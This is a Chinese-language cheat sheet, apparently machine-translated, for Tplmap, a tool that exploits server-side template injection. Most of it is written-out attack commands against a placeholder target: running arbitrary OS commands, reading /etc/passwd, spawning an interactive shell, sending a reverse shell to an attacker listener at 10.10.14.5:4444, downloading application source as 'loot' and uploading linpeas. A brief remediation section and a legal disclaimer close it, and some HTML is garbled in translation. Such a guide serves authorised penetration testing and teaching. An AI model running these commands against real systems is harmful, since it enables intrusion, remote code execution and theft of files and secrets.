<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎭 Tplmap - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
  ████████╗██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
  ╚══██╔══╝██╔══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
     ██║   ██████╔╝██║     ██╔████╔██║███████║██████╔╝
     ██║   ██╔═══╝ ██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
     ██║   ██║     ███████╗██║ ╚═╝ ██║██║  ██║██║     
     ╚═╝   ╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
       Server-Side Template Injection (SSTI) Automated Exploiter
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/Tplmap-SSTI_Exploitation-blue?style=for-the-badge" alt="Tplmap">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-orange?style=for-the-badge" alt="网络安全和 API">
  <img src="https://img.shields.io/badge/Engines-Jinja2_Twig_Mako_Freemarker-green?style=for-the-badge" alt="模板引擎">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="许可证 GPLv2">
</p>

<p对齐=“中心”>
  <b>🌐自动化利用工具，旨在检测和利用服务器端模板注入（SSTI）漏洞以实现远程代码执行</b>
</p>

---

## 📋 目录

- [概述和 SSTI 漏洞](#-overview--the-ssti-vulnerability)
- [支持的模板引擎](#-supported-template-engines)
- [安装](#-安装)
- [基础漏洞检测](#-basic-vulnerability-detection)
- [针对特定注射点（`*` 标记）](#-targeting-specific-injection-points--marker)
- [远程命令执行(`--os-cmd`)](#-remote-command-execution---os-cmd)
- [交互式 Shell 和反向连接](#-interactive-shells--reverse-connections)
- [文件上传与下载](#-file-upload--download)
- [测试 POST 数据和标题](#-testing-post-data--headers)
- [快速参考表](#-quick-reference-table)
- [防御考虑与补救](#-defective-considerations--remediation)
- [法律免责声明](#-legal-disclaimer)

---

## 🎯 概述和 SSTI 漏洞

当应用程序将未经验证的用户输入直接嵌入到服务器端模板中而不是将其作为要呈现的数据传递时，就会发生**服务器端模板注入 (SSTI)**。由于现代模板引擎允许 `{{7*7}}` 或 `${7*7}` 等语法，因此攻击者可以突破沙箱并访问底层运行时环境（Python、Java、PHP、Ruby、Node.js）。

**Tplmap** 由 **Miroslav Stampar** 和 **Emilio Pinna** 编写，充当“模板引擎的 SQLMap”。它自动对活动模板引擎进行指纹识别，突破模板评估上下文，并将代码执行升级到完整的操作系统级 shell 访问。

---

## 🧩 支持的模板引擎

|语言 |支持的模板引擎 |
|----------|----------------------------|
| **Python** | Jinja2、Mako、Tornado、Nunjucks |
| **PHP** |树枝，聪明|
| **Java** | Freemarker、速度 |
| **红宝石** | ERB，苗条|
| **Node.js** |玉、哈巴狗、Dust.js |

---

## 📥 安装

Tplmap 是基于 Python 构建的：
```bash
# Clone GitHub repository
git clone https://github.com/epinna/tplmap.git
cd tplmap

# Install dependencies
pip install -r requirements.txt

# Verify installation
python tplmap.py --help
```
---

## 🚀 基本漏洞检测
```bash
# Scan a GET parameter for SSTI
python tplmap.py -u "http://target.local/page?name=John"

# Mark explicit injection point using an asterisk (*)
python tplmap.py -u "http://target.local/profile?id=1&bio=*"
```
---

## 💻 远程命令执行 (`--os-cmd`)

一旦 Tplmap 检测到引擎（例如 Jinja2），直接执行任意 shell 命令：
```bash
# Execute whoami on target
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "whoami; id"

# Read sensitive configuration files
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "cat /etc/passwd"
```
---

## 💀 交互式 shell 和反向连接
```bash
# Spawn an interactive pseudo-terminal within Tplmap
python tplmap.py -u "http://target.local/page?name=*" --os-shell

# Drop a full reverse TCP connection to a Netcat listener
python tplmap.py -u "http://target.local/page?name=*" \
  --reverse-shell 10.10.14.5 4444
```
---

## 📁 文件上传和下载

窃取源代码或上传持久性工具：
```bash
# Download remote source code or configuration
python tplmap.py -u "http://target.local/page?name=*" \
  --download /var/www/html/app.py ./app_loot.py

# Upload a local payload to remote /tmp/ directory
python tplmap.py -u "http://target.local/page?name=*" \
  --upload ./linpeas.sh /tmp/linpeas.sh
```
---

## 🌐 测试 POST 数据和标头
```bash
# Test POST body parameters
python tplmap.py -u "http://target.local/comment" -d "author=test&comment=*"

# Test HTTP Headers
python tplmap.py -u "http://target.local/dashboard" -H "User-Agent: *"

# Test behind authenticated session cookies
python tplmap.py -u "http://target.local/welcome?user=*" -c "session=xyz123"
```
---

## ⚡ 快速参考表

|目标|命令 |
|------------|---------|
| **检测 URL 中的 SSTI** | `python tplmap.py -u "<URL>?param=*"` |
| **执行远程命令** | `python tplmap.py -u "<URL>" --os-cmd="<CMD>"` |
| **交互式终端** | `python tplmap.py -u "<URL>" --os-shell` |
| **删除反向外壳** | `python tplmap.py -u "<URL>" --reverse-shell <IP> <PORT>` |
| **下载远程文件** | `python tplmap.py -u "<URL>" --download <REMOTE> <LOCAL>` |
| **上传本地文件** | `python tplmap.py -u "<URL>" --upload <LOCAL> <REMOTE>` |
| **测试 POST 主体** | `python tplmap.py -u "<URL>" -d "data=*"` |

---

## 🛡️ 防御注意事项和补救措施

1. **上下文感知转义：**切勿将原始用户输入连接到模板字符串中。使用模板引擎的本机变量绑定机制（例如，在 Jinja2 中：`render_template('hello.html', name=user_input)` 而不是 `render_template_string(f"Hello {user_input}")`）。
2. **沙箱限制：** 在动态渲染不可避免的引擎内强制执行严格的沙箱，禁止访问 `__class__`、`__mro__` 或反射对象。

---

## ⚠️ 法律免责声明

> [!警告]
> Tplmap 在目标应用程序服务器上执行任意远程代码。未经事先书面授权测试或利用网络应用程序是严格违法的。